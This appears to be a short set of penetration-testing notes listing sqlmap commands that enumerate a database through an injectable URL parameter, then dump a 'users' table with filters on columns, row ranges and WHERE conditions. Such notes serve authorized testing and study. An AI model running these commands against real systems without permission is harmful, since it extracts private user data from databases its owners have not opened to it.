#### Basic DB Data Enumeration
```python
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

##### After db enumeration, the next step is table enumeration
```python
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
##### After spotting the tables, we can dump its content by 
```python
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

## Table/Row Enumeration
#### When dealing with large tables, we can specify the columns/rows that we wanna see

```python
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

```python
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
#To narrow down the rows based on their ordinal number(s) inside the table
```

## Conditional Enumeration
If there is a requirement to retrieve certain rows based on a known `WHERE` condition
```python
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
